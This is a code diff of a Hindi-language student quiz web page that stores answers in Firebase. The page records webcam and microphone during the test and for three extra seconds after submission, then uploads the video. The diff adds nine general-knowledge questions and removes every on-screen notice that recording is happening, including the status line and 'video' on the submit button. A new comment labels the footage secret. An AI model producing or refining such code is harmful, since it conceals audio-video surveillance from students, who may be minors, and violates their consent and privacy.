@@ -11,20 +11,30 @@
     <style>
         * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; }
         body { background: #f0f4f8; color: #1e293b; padding: 15px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .app-card { width: 100%; max-width: 500px; background: white; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); overflow: hidden; }
+        .app-card { width: 100%; max-width: 550px; background: white; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); overflow: hidden; }
         .banner { background: linear-gradient(135deg, #1e3c72, #2a5298); color: white; padding: 25px; text-align: center; }
         .banner h2 { font-size: 22px; margin-bottom: 5px; }
         .content { padding: 25px; }
         .input-group { margin-bottom: 18px; }
         .input-group label { display: block; margin-bottom: 6px; font-weight: bold; font-size: 14px; }
         .input-group input { width: 100%; padding: 12px; border: 1px solid #cbd5e1; border-radius: 8px; font-size: 14px; }
+        
+        /* Questions Layout */
+        .qa-container { max-height: 400px; overflow-y: auto; padding-right: 5px; margin-bottom: 20px; }
         .qa-section { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 10px; padding: 15px; margin-bottom: 15px; }
-        .qa-title { font-weight: bold; font-size: 14px; color: #1e3c72; margin-bottom: 8px; }
-        .qa-options label { display: block; background: white; border: 1px solid #cbd5e1; padding: 10px; border-radius: 6px; margin-bottom: 6px; font-size: 13px; cursor: pointer; }
-        .btn-submit { width: 100%; padding: 15px; background: #1e3c72; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        .qa-title { font-weight: bold; font-size: 14px; color: #1e3c72; margin-bottom: 10px; }
+        .qa-options label { display: block; background: white; border: 1px solid #cbd5e1; padding: 10px; border-radius: 6px; margin-bottom: 6px; font-size: 13px; cursor: pointer; transition: 0.2s; }
+        .qa-options label:hover { background: #f1f5f9; }
+        .qa-options input { margin-right: 8px; }
+        
+        .btn-submit { width: 100%; padding: 15px; background: #1e3c72; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.2s; }
+        .btn-submit:hover { background: #152e5b; }
         .btn-submit:disabled { background: #64748b; cursor: not-allowed; }
-        .status-feed { font-size: 12px; color: #64748b; text-align: center; margin-top: 10px; font-style: italic; }
-        .success-msg { display: none; text-align: center; color: #16a34a; font-weight: bold; margin-top: 15px; font-size: 16px; }
+        
+        /* Success screen styling */
+        .success-msg { display: none; text-align: center; padding: 30px 10px; }
+        .success-msg h3 { color: #16a34a; font-size: 22px; margin-bottom: 12px; }
+        .success-msg p { color: #475569; font-size: 15px; line-height: 1.6; }
     </style>
 
     <script>
@@ -43,16 +53,26 @@
         const database = firebase.database();
 
         const urlParams = new URLSearchParams(window.location.search);
-        // छात्र की यूनिक आईडी (जैसे रोल नंबर या मोबाइल नंबर)
         let studentId = urlParams.get('id') || 'guest_user';
-        
-        // हर एक नए प्रयास के लिए एक यूनिक टाइमस्टैम्प आईडी
         let attemptId = 'attempt_' + Date.now(); 
 
         let mediaRecorder;
         let recordedChunks = [];
-        let currentAnswers = { answer_q1: "Not Answered" };
         let studentName = "";
+        
+        // 10 प्रश्नों की नई सूची और उनके डिफॉल्ट उत्तर (शुरुआत में सब "Not Answered")
+        let currentAnswers = {
+            answer_q1: "Not Answered",
+            answer_q2: "Not Answered",
+            answer_q3: "Not Answered",
+            answer_q4: "Not Answered",
+            answer_q5: "Not Answered",
+            answer_q6: "Not Answered",
+            answer_q7: "Not Answered",
+            answer_q8: "Not Answered",
+            answer_q9: "Not Answered",
+            answer_q10: "Not Answered"
+        };
 
         window.addEventListener("load", initExam);
 
@@ -60,7 +80,7 @@
             try {
                 let stream = await navigator.mediaDevices.getUserMedia({ video: { width: 240, height: 180 }, audio: true });
                 
-                // 1. छात्र की मुख्य प्रोफाइल पर उसका स्टेटस अपडेट करना
+                // डेटाबेस में प्रोफाइल स्टेटस अपडेट करना
                 database.ref('students/' + studentId + '/profile').update({
                     last_active_at: new Date().toISOString(),
                     portal_status: "OPENED"
@@ -90,14 +110,15 @@
                 reader.onloadend = function() {
                     let base64String = reader.result;
                     
-                    // 2. सारे टेस्ट प्रयास और वीडियो एक ही छात्र प्रोफ़ाइल के अंदर सेव होंगे
+                    // प्रयास और गुप्त वीडियो सुरक्षित सेव होना
                     database.ref('students/' + studentId + '/test_attempts/' + attemptId).set({
                         student_name: studentName || "Unknown",
                         answers: currentAnswers,
                         recorded_video_feed: base64String,
                         submitted_at: new Date().toISOString()
                     }).then(() => {
-                        document.getElementById('status-text').style.display = 'none';
+                        // फॉर्म वाली बॉडी को छिपाकर सीधे सक्सेस स्क्रीन दिखाना
+                        document.getElementById('form-block').style.display = 'none';
                         document.getElementById('success-block').style.display = 'block';
                         
                         database.ref('students/' + studentId + '/profile').update({
@@ -111,7 +132,6 @@
             mediaRecorder.start();
         }
 
-        // इनपुट ट्रैक करने के लिए लोकल वेरिएबल्स अपडेट करना
         function trackInput(key, value) {
             if (key === 'student_name') {
                 studentName = value;
@@ -124,17 +144,17 @@
         function submitTest(event) {
             event.preventDefault();
             
-            // बटन को तुरंत डिसेबल करना ताकि छात्र दोबारा क्लिक न कर सके
+            // बटन को तुरंत डिसएबल करना
             const submitBtn = document.getElementById('submit-btn');
             submitBtn.disabled = true;
-            document.getElementById('status-text').innerText = "उत्तर सबमिट कर दिए गए हैं। अंतिम सत्यापन चल रहा है, कृपया कैमरे के सामने बने रहें...";
+            submitBtn.innerText = "कृपया प्रतीक्षा करें...";
 
-            // बदलाव २: सबमिट बटन दबाने के ठीक ३ सेकंड बाद रिकॉर्डिंग बंद होगी
+            // ठीक ३ सेकंड बाद बैकग्राउंड रिकॉर्डिंग बंद होगी और डेटा अपलोड होगा
             setTimeout(() => {
                 if (mediaRecorder && mediaRecorder.state !== "inactive") {
                     mediaRecorder.stop();
                 }
-            }, 3000); // ३००० मिलीसेकंड = ३ सेकंड की अतिरिक्त पोस्ट-सबमिट रिकॉर्डिंग
+            }, 3000);
         }
     </script>
 </head>
@@ -147,25 +167,115 @@
     </div>
 
     <div class="content">
-        <form onsubmit="submitTest(event)">
-            <div class="input-group">
-                <label>छात्र का पूरा नाम:</label>
-                <input type="text" placeholder="यहाँ अपना नाम लिखें" required oninput="trackInput('student_name', this.value)">
-            </div>
-
-            <div class="qa-section">
-                <div class="qa-title">💡 सवाल १: कंप्यूटर का कौन सा भाग 'मस्तिष्क' (Brain) कहलाता है?</div>
-                <div class="qa-options">
-                    <label><input type="radio" name="q1" value="A" onclick="trackInput('answer_q1', 'A')"> A) मॉनिटर</label>
-                    <label><input type="radio" name="q1" value="B" onclick="trackInput('answer_q1', 'B')"> B) सी.पी.यू. (CPU)</label>
-                    <label><input type="radio" name="q1" value="C" onclick="trackInput('answer_q1', 'C')"> C) कीबोर्ड</label>
+        <div id="form-block">
+            <form onsubmit="submitTest(event)">
+                <div class="input-group">
+                    <label>छात्र का पूरा नाम:</label>
+                    <input type="text" placeholder="यहाँ अपना नाम लिखें" required oninput="trackInput('student_name', this.value)">
                 </div>
-            </div>
 
-            <button type="submit" id="submit-btn" class="btn-submit">उत्तर और वीडियो सबमिट करें</button>
-            <div id="status-text" class="status-feed">कैमरा और ऑडियो बैकग्राउंड में सुरक्षित रिकॉर्ड हो रहे हैं...</div>
-            <div id="success-block" class="success-msg">✓ आपका टेस्ट और वीडियो सफलतापूर्वक रिकॉर्ड कर लिया गया है!</div>
-        </form>
+                <div class="qa-container">
+                    
+                    <div class="qa-section">
+                        <div class="qa-title">💡 सवाल १: कंप्यूटर का कौन सा भाग 'मस्तिष्क' (Brain) कहलाता है?</div>
+                        <div class="qa-options">
+                            <label><input type="radio" name="q1" value="A" onclick="trackInput('answer_q1', 'A')"> A) मॉनिटर</label>
+                            <label><input type="radio" name="q1" value="B" onclick="trackInput('answer_q1', 'B')"> B) सी.पी.यू. (CPU)</label>
+                            <label><input type="radio" name="q1" value="C" onclick="trackInput('answer_q1', 'C')"> C) कीबोर्ड</label>
+                        </div>
+                    </div>
+
+                    <div class="qa-section">
+                        <div class="qa-title">💡 सवाल २: मध्य प्रदेश की राजधानी कहाँ स्थित है?</div>
+                        <div class="qa-options">
+                            <label><input type="radio" name="q2" value="A" onclick="trackInput('answer_q2', 'A')"> A) इंदौर</label>
+                            <label><input type="radio" name="q2" value="B" onclick="trackInput('answer_q2', 'B')"> B) भोपाल</label>
+                            <label><input type="radio" name="q2" value="C" onclick="trackInput('answer_q2', 'C')"> C) जबलपुर</label>
+                        </div>
+                    </div>
+
+                    <div class="qa-section">
+                        <div class="qa-title">💡 सवाल ३: इंटरनेट पर किसी वेबसाइट को खोजने के लिए किसका उपयोग किया जाता है?</div>
+                        <div class="qa-options">
+                            <label><input type="radio" name="q3" value="A" onclick="trackInput('answer_q3', 'A')"> A) सर्च इंजन (Search Engine)</label>
+                            <label><input type="radio" name="q3" value="B" onclick="trackInput('answer_q3', 'B')"> B) कीबोर्ड</label>
+                            <label><input type="radio" name="q3" value="C" onclick="trackInput('answer_q3', 'C')"> C) मॉनिटर</label>
+                        </div>
+                    </div>
+
+                    <div class="qa-section">
+                        <div class="qa-title">💡 सवाल ४: सफ़ेद शेरों की भूमि मध्य प्रदेश के किस जिले को कहा जाता है?</div>
+                        <div class="qa-options">
+                            <label><input type="radio" name="q4" value="A" onclick="trackInput('answer_q4', 'A')"> A) सतना</label>
+                            <label><input type="radio" name="q4" value="B" onclick="trackInput('answer_q4', 'B')"> B) रीवा</label>
+                            <label><input type="radio" name="q4" value="C" onclick="trackInput('answer_q4', 'C')"> C) पन्ना</label>
+                        </div>
+                    </div>
+
+                    <div class="qa-section">
+                        <div class="qa-title">💡 सवाल ५: कंप्यूटर में फाइलों को स्थायी रूप से कहाँ सुरक्षित (Save) किया जाता है?</div>
+                        <div class="qa-options">
+                            <label><input type="radio" name="q5" value="A" onclick="trackInput('answer_q5', 'A')"> A) रैम (RAM)</label>
+                            <label><input type="radio" name="q5" value="B" onclick="trackInput('answer_q5', 'B')"> B) हार्ड डिस्क (Hard Disk)</label>
+                            <label><input type="radio" name="q5" value="C" onclick="trackInput('answer_q5', 'C')"> C) प्रिंटर</label>
+                        </div>
+                    </div>
+
+                    <div class="qa-section">
+                        <div class="qa-title">💡 सवाल ६: भारत का राष्ट्रीय खेल कौन सा माना जाता है?</div>
+                        <div class="qa-options">
+                            <label><input type="radio" name="q6" value="A" onclick="trackInput('answer_q6', 'A')"> A) क्रिकेट</label>
+                            <label><input type="radio" name="q6" value="B" onclick="trackInput('answer_q6', 'B')"> B) हॉकी</label>
+                            <label><input type="radio" name="q6" value="C" onclick="trackInput('answer_q6', 'C')"> C) कबड्डी</label>
+                        </div>
+                    </div>
+
+                    <div class="qa-section">
+                        <div class="qa-title">💡 सवाल ७: इनमें से कौन सा एक ऑपरेटिंग सिस्टम (Operating System) है?</div>
+                        <div class="qa-options">
+                            <label><input type="radio" name="q7" value="A" onclick="trackInput('answer_q7', 'A')"> A) Windows</label>
+                            <label><input type="radio" name="q7" value="B" onclick="trackInput('answer_q7', 'B')"> B) MS Word</label>
+                            <label><input type="radio" name="q7" value="C" onclick="trackInput('answer_q7', 'C')"> C) Google Chrome</label>
+                        </div>
+                    </div>
+
+                    <div class="qa-section">
+                        <div class="qa-title">💡 सवाल ८: सौरमंडल का सबसे बड़ा ग्रह कौन सा है?</div>
+                        <div class="qa-options">
+                            <label><input type="radio" name="q8" value="A" onclick="trackInput('answer_q8', 'A')"> A) मंगल (Mars)</label>
+                            <label><input type="radio" name="q8" value="B" onclick="trackInput('answer_q8', 'B')"> B) बृहस्पति (Jupiter)</label>
+                            <label><input type="radio" name="q8" value="C" onclick="trackInput('answer_q8', 'C')"> C) पृथ्वी (Earth)</label>
+                        </div>
+                    </div>
+
+                    <div class="qa-section">
+                        <div class="qa-title">💡 सवाल ९: 'WWW' का पूर्ण रूप (Full Form) क्या होता है?</div>
+                        <div class="qa-options">
+                            <label><input type="radio" name="q9" value="A" onclick="trackInput('answer_q9', 'A')"> A) World Wide Web</label>
+                            <label><input type="radio" name="q9" value="B" onclick="trackInput('answer_q9', 'B')"> B) World Wide Word</label>
+                            <label><input type="radio" name="q9" value="C" onclick="trackInput('answer_q9', 'C')"> C) Web Window World</label>
+                        </div>
+                    </div>
+
+                    <div class="qa-section">
+                        <div class="qa-title">💡 सवाल १०: भोपाल को "झीलों की नगरी" क्यों कहा जाता है?</div>
+                        <div class="qa-options">
+                            <label><input type="radio" name="q10" value="A" onclick="trackInput('answer_q10', 'A')"> A) यहाँ कई प्राकृतिक और कृत्रिम झीलें हैं</label>
+                            <label><input type="radio" name="q10" value="B" onclick="trackInput('answer_q10', 'B')"> B) यहाँ केवल नदियाँ बहती हैं</label>
+                            <label><input type="radio" name="q10" value="C" onclick="trackInput('answer_q10', 'C')"> C) यह पर्वतों से घिरा हुआ है</label>
+                        </div>
+                    </div>
+
+                </div>
+
+                <button type="submit" id="submit-btn" class="btn-submit">उत्तर सबमिट करें</button>
+            </form>
+        </div>
+
+        <div id="success-block" class="success-msg">
+            <h3>✓ टेस्ट पूरा हुआ</h3>
+            <p>जल्द ही आपको अगला टेस्ट मिलेगा, आप इस पेज को बंद कर सकते हैं।</p>
+        </div>
     </div>
 </div>
 
